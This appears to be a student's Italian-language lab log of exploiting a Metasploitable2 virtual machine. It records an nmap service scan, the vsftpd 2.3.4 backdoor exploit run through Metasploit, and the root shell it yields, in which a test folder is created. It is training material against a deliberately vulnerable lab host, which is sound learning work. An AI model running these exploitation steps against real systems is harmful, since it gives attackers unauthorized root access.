ESERCITAZIONE S7 L1

0 - configurazione metasploit: ip=192.168.1.149

1 - accesso a metasploit framework:
	msfconsole
	Metasploit tip: Search can apply complex filters such as search cve:2009 
	type:exploit, see all the filters with help search
                                                  

                                	   .,,.                  .
                        	        .\$$$$$L..,,==aaccaacc%#s$b.       d8,    d8P
                	     d8P        #$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p
        	          d888888P      '7$$$$\""""''^^`` .7$$$|D*"'```         ?88'
  	d8bd8b.d8p d8888b ?88' d888b8b            _.os#$|8*"`   d8P       ?8b  88P
  	88P`?P'?P d8b_,dP 88P d8P' ?88       .oaS###S*"`       d8P d8888b $whi?88b 88b
 	d88  d8 ?8 88b     88b 88b  ,88b .osS$$$$*" ?88,.d88b, d88 d8P' ?88 88P `?8b
	d88' d88b 8b`?8888P'`?8b`?88P'.aS$$$$Q*"`    `?88'  ?88 ?88 88b  d88 d88
                        	  .a#$$$$$$"`          88b  d8P  88b`?8888P'
                	       ,s$$$$$$$"`             888888P'   88n      _.,,,ass;:
        	            .a$$$$$$$P`               d88P'    .,.ass%#S$$$$$$$$$$$$$$'
                	 .a$###$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$'
              		,a$$###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS'
        	   .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--""''^^/$$$$$$'
	_______________________________________________________________   ,&$$$$$$'_____
                                	                                 ll&&$$$$'
                        	                                      .;;lll&&&&'
                	                                            ...;;lllll&'
	                                                          ......;;;llll;;;....
        	                                                   ` ......;;;;... .  .
									
		
       		=[ metasploit v6.4.38-dev                          ]
	+ -- --=[ 2467 exploits - 1270 auxiliary - 431 post       ]
	+ -- --=[ 1478 payloads - 49 encoders - 13 nops           ]
	+ -- --=[ 9 evasion                                       ]

	Metasploit Documentation: https://docs.metasploit.com


2 - scansione e analisi del dispositivo target:
	msf6 > nmap -sS -sV -O -A 192.168.1.149
	[*] exec: nmap -sS -sV -O -A 192.168.1.149
	
	Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-16 15:46 CET
	Nmap scan report for 192.168.1.149
	Host is up (0.0027s latency).
	Not shown: 977 closed tcp ports (reset)
	PORT     STATE SERVICE      VERSION
	21/tcp   open  ftp          vsftpd 2.3.4
	|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
	| ftp-syst: 
	|   STAT: 
	| FTP server status:
	|      Connected to 192.168.1.11
	|      Logged in as ftp
	|      TYPE: ASCII
	|      No session bandwidth limit
	|      Session timeout in seconds is 300
	|      Control connection is plain text
	|      Data connections will be plain text
	|      vsFTPd 2.3.4 - secure, fast, stable
	|_End of status
	22/tcp   open  ssh          OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
	| ssh-hostkey: 
	|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
	|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
	23/tcp   open  telnet       Linux telnetd
	25/tcp   open  smtp         Postfix smtpd
	|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
	| sslv2: 
	|   SSLv2 supported
	|   ciphers: 
	|     SSL2_RC2_128_CBC_WITH_MD5
	|     SSL2_DES_192_EDE3_CBC_WITH_MD5
	|     SSL2_DES_64_CBC_WITH_MD5
	|     SSL2_RC4_128_WITH_MD5
	|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
	|_    SSL2_RC4_128_EXPORT40_WITH_MD5
	|_ssl-date: 2024-12-16T12:45:52+00:00; -2h04m21s from scanner time.
	| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside 	US/countryName=XX
	| Not valid before: 2010-03-17T14:07:45
	|_Not valid after:  2010-04-16T14:07:45
	53/tcp   open  domain       ISC BIND 9.4.2
	| dns-nsid: 
	|_  bind.version: 9.4.2
	80/tcp   open  http         Apache httpd 2.2.8 ((Ubuntu) DAV/2)
	|_http-title: Metasploitable2 - Linux
	|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
	111/tcp  open  rpcbind      2 (RPC #100000)
	| rpcinfo: 
	|   program version    port/proto  service
	|   100000  2            111/tcp   rpcbind
	|   100000  2            111/udp   rpcbind
	|   100003  2,3,4       2049/tcp   nfs
	|   100003  2,3,4       2049/udp   nfs
	|   100005  1,2,3      36145/tcp   mountd
	|   100005  1,2,3      56931/udp   mountd
	|   100021  1,3,4      33925/udp   nlockmgr
	|   100021  1,3,4      35131/tcp   nlockmgr
	|   100024  1          39817/tcp   status
	|_  100024  1          43016/udp   status
	139/tcp  open  netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
	445/tcp  open  netbios-ssn  Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
	512/tcp  open  exec?
	513/tcp  open  login        OpenBSD or Solaris rlogind
	514/tcp  open  tcpwrapped
	1099/tcp open  java-rmi     GNU Classpath grmiregistry
	1524/tcp open  bindshell    Metasploitable root shell
	2049/tcp open  nfs          2-4 (RPC #100003)
	2121/tcp open  ccproxy-ftp?
	3306/tcp open  mysql        MySQL 5.0.51a-3ubuntu5
	| mysql-info: 
	|   Protocol: 10
	|   Version: 5.0.51a-3ubuntu5
	|   Thread ID: 9
	|   Capabilities flags: 43564
	|   Some Capabilities: SupportsCompression, Support41Auth, LongColumnFlag, SupportsTransactions, SwitchToSSLAfterHandshake, Speaks41ProtocolNew, 	ConnectWithDatabase
	|   Status: Autocommit
	|_  Salt: qi;,iM%o"Uj4cvHFcA['
	5432/tcp open  postgresql   PostgreSQL DB 8.3.0 - 8.3.7
	|_ssl-date: 2024-12-16T12:45:52+00:00; -2h04m21s from scanner time.
	| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside 	US/countryName=XX
	| Not valid before: 2010-03-17T14:07:45
	|_Not valid after:  2010-04-16T14:07:45
	5900/tcp open  vnc          VNC (protocol 3.3)
	| vnc-info: 
	|   Protocol version: 3.3
	|   Security types: 
	|_    VNC Authentication (2)
	6000/tcp open  X11          (access denied)
	6667/tcp open  irc          UnrealIRCd
	| irc-info: 
	|   users: 1
	|   servers: 1
	|   lusers: 1
	|   lservers: 0
	|   server: irc.Metasploitable.LAN
	|   version: Unreal3.2.8.1. irc.Metasploitable.LAN 
	|   uptime: 0 days, 0:18:36
	|   source ident: nmap
	|   source host: Test-ED7EC61D.homenet.telecomitalia.it
	|_  error: Closing Link: ynptxoebp[kali.homenet.telecomitalia.it] (Quit: ynptxoebp)
	8009/tcp open  ajp13        Apache Jserv (Protocol v1.3)
	|_ajp-methods: Failed to get a valid response for the OPTION request
	8180/tcp open  http         Apache Tomcat/Coyote JSP engine 1.1
	|_http-server-header: Apache-Coyote/1.1
	|_http-title: Apache Tomcat/5.5
	|_http-favicon: Apache Tomcat
	MAC Address: 08:00:27:43:2A:32 (Oracle VirtualBox virtual NIC)
	Device type: general purpose|WAP|terminal|specialized|proxy server
	Running (JUST GUESSING): Linux 2.6.X|2.4.X|3.X (97%), Linksys embedded (95%), AVM embedded (95%), Chip PC embedded (94%), Citrix XenServer 5.X 	(94%)
	OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/h:linksys:wrv54g cpe:/h:avm:fritz%21box_fon_wlan_7240 cpe:/o:linux:linux_kernel:2.4.32 	cpe:/o:linux:linux_kernel:3.0 cpe:/o:linux:linux_kernel cpe:/o:citrix:xenserver:5.5 cpe:/o:linux:linux_kernel:2.4.18
	Aggressive OS guesses: Linux 2.6.9 - 2.6.24 (97%), Linux 2.6.9 - 2.6.30 (97%), Linux 2.6.9 - 2.6.33 (97%), Linux 2.6.13 - 2.6.32 (97%), Linux 	2.6.22 - 2.6.23 (96%), Linux 2.6.9 (96%), Linux 2.6.12 - 2.6.14 (embedded) (95%), Linux 2.6.18 - 2.6.32 (95%), Linux 2.6.32 (95%), Linksys WRV54G 	WAP (95%)
	No exact OS matches for host (test conditions non-ideal).
	Network Distance: 1 hop
	Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

	Host script results:
	| smb-os-discovery: 
	|   OS: Unix (Samba 3.0.20-Debian)
	|   Computer name: metasploitable
	|   NetBIOS computer name: 
	|   Domain name: localdomain
	|   FQDN: metasploitable.localdomain
	|_  System time: 2024-12-16T07:45:36-05:00
	|_smb2-time: Protocol negotiation failed (SMB2)
	|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
	|_clock-skew: mean: -49m14s, deviation: 2h30m04s, median: -2h04m21s
	| smb-security-mode: 
	|   account_used: guest
	|   authentication_level: user
	|   challenge_response: supported
	|_  message_signing: disabled (dangerous, but default)
	
	TRACEROUTE
	HOP RTT     ADDRESS
	1   2.71 ms 192.168.1.149
	
	OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 205.49 seconds

3 - ricerca exploit e configurazione:
	msf6 > search vsftpd
                                                                                                                                                                            
	Matching Modules                                                                                                                                                            
	================                                                                                                                                                            
	                                                                                                                                                                            
	   #  Name                                  Disclosure Date  Rank       Check  Description                                                                                  
	   -  ----                                  ---------------  ----       -----  -----------                                                                                  
	   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service                                                               
	   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution                                                     
                                                                                                                                                                            
                                                                                                                                                                            
	Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor                                                              
                                                                                                                                                                            
	msf6 > use 1
	[*] No payload configured, defaulting to cmd/unix/interact                                                                                                                  
	msf6 exploit(unix/ftp/vsftpd_234_backdoor) > options                                                                                                                        
                                                                                                                                                                            
	Module options (exploit/unix/ftp/vsftpd_234_backdoor):                                                                                                                      
                                                                                                                                                                            
	   Name     Current Setting  Required  Description                                                                                                                          
	   ----     ---------------  --------  -----------                                                                                                                          
	   CHOST                     no        The local client address                                                                                                             
	   CPORT                     no        The local client port                                                                                                                
	   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]                                                                         
	   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html                               
	   RPORT    21               yes       The target port (TCP)                                                                                                                
                                                                                                                                                                            
                                                                                                                                                                            
	Exploit target:                                                                                                                                                             
                                                                                                                                                                            
	   Id  Name                                                                                                                                                                 
	   --  ----                                                                                                                                                                 
	   0   Automatic                                                                                                                                                            
                                                                                                                                                                            
                                                                                                                                                                            
                                                                                                                                                                            
	View the full module info with the info, or info -d command.                                                                                                                
	                                                                                                                                                                            
	msf6 exploit(unix/ftp/vsftpd_234_backdoor) > options

	Module options (exploit/unix/ftp/vsftpd_234_backdoor):

	   Name     Current Setting  Required  Description
	   ----     ---------------  --------  -----------
	   CHOST                     no        The local client address
	   CPORT                     no        The local client port
	   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
	   RHOSTS   192.168.1.149    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
	   RPORT    21               yes       The target port (TCP)


	Exploit target:

	   Id  Name
	   --  ----
	   0   Automatic



	View the full module info with the info, or info -d command.

4 - run:
	msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 192.168.1.149:21 - The port used by the backdoor bind listener is already open
[+] 192.168.1.149:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.1.11:41191 -> 192.168.1.149:6200) at 2024-12-16 16:02:31 +0100

	pwd
	/

	sudo mkdir /test_metasploit	

	ls
	bin
	boot
	cdrom
	dev
	etc	
	home
	initrd
	initrd.img
	lib
	lost+found
	media
	mnt
	nohup.out
	opt
	proc
	root
	sbin
	srv
	sys
	test_metasploit		<==
	tmp
	usr
	var
	vmlinuz

	